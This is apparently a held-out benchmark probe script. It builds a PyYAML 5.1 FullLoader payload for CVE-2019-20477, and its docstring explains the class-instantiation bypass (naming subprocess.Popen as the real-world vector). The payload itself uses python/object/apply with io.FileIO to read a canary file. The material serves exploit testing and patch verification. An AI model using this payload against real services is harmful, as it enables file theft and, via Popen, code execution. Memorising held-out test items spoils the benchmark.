#!/usr/bin/env python3
"""[HELD-OUT] CVE-2019-20477 residual — class-deserialization escape of the CVE-2017-18342 FullLoader
guard.

V1 (pyyaml 5.1) carries the CVE-2017-18342 guard: FullLoader still registers the
`tag:yaml.org,2002:python/object/apply:` multi-constructor on `FullConstructor`, and
`make_python_instance` blocks apply only when the target is NOT a class:

    if not (unsafe or isinstance(cls, type)):
        raise ConstructorError(..., "expected a class, but found %r" % type(cls), ...)
    ...
    return cls(*args, **kwds)          # <-- any TYPE is instantiated, no allowlist

So a document that applies `python/object/apply` to a **class** (a `type`) is permitted and the class
is instantiated with attacker-chosen args — exactly NVD CVE-2019-20477: "insufficient restrictions on
the load and load_all functions because of a class deserialization issue, e.g., Popen is a class in
the subprocess module ... incomplete fix for CVE-2017-18342."

Rendered benign (no subprocess.Popen, no command/network): the payload instantiates only stdlib
classes — it applies `builtins.list` to a nested `io.FileIO` opened on the canary path. Iterating the
FileIO reads the file, so `list(io.FileIO("/canary/flag.txt", "r"))` == `[b"<flag>\n"]`; the flag
appears in the loaded object's repr.

    !!python/object/apply:builtins.list
    - !!python/object/apply:io.FileIO
      - /canary/flag.txt
      - r

  - Only class (`type`) applies -> passes FullConstructor.make_python_instance's `isinstance(cls, type)`.
  - `python/object/apply` is still a FullConstructor tag on 5.1 -> the tag resolves -> instantiation runs.
  => yaml.load(..., Loader=FullLoader) on V1 constructs the objects, reads the canary -> ${PCB_FLAG} (BYPASS).

CVE-2019-20477 fix (V2 = pyyaml 5.2, PR #347) REMOVES `python/object/apply` from `FullConstructor`
(moves it to `UnsafeConstructor`). On V2 the tag has no constructor -> ConstructorError "could not
determine a constructor for the tag 'tag:yaml.org,2002:python/object/apply:...'" -> BLOCKED.

Contract: reaches the canary on V1; closed on V2.
"""
from __future__ import annotations

CANARY_PATH = "/canary/flag.txt"

# python/object/apply on CLASSES ONLY: list( io.FileIO(canary, "r") ). Both builtins.list and
# io.FileIO are types, so FullConstructor instantiates them; iterating the file reads the canary.
PAYLOAD = (
    "!!python/object/apply:builtins.list\n"
    "- !!python/object/apply:io.FileIO\n"
    "  - %s\n"
    "  - r\n" % CANARY_PATH
)


def candidate() -> dict:
    return {
        "probe_id": "cve-2019-20477-apply-class-list-fileio",
        "method": "POST",
        "endpoint": "/load",
        "code": PAYLOAD,
    }


if __name__ == "__main__":
    print(candidate()["code"])
